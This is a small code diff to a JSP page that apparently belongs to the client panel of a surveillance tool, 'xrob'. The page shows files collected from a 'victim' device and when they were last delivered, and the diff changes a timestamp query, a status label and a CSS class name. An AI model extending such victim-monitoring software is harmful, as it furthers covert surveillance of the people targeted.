@@ -7,6 +7,7 @@
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
 <%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
 <%@ page import="java.util.List" %>
+<%@ page import="com.theah64.xrob.api.models.Delivery" %>
 <%--
   Created by IntelliJ IDEA.
   User: theapache64
@@ -60,7 +61,7 @@
 
                 if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {
 
-                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(theVictim.getId());
+                    final String lastUpdatedTime = Deliveries.getInstance().getLastDeliveryTime(Delivery.TYPE_FILES, theVictim.getId());
 
     %>
 
@@ -85,7 +86,7 @@
 
                 <%=searchTemplate.getTopTemplate(
                         theVictim.getIdentity(),
-                        lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")")%>
+                        lastUpdatedTime == null ? "(Not yet updated)" : "(last update " + lastUpdatedTime + ")")%>
 
                 <table id="tFiles" class="table table-bordered table-condensed">
                     <tr>
@@ -96,7 +97,7 @@
                     <%
                         for (final File file : files) {
                     %>
-                    <tr class="files">
+                    <tr class="file_row">
 
                         <td><%
                             if (file.isDirectory()) {
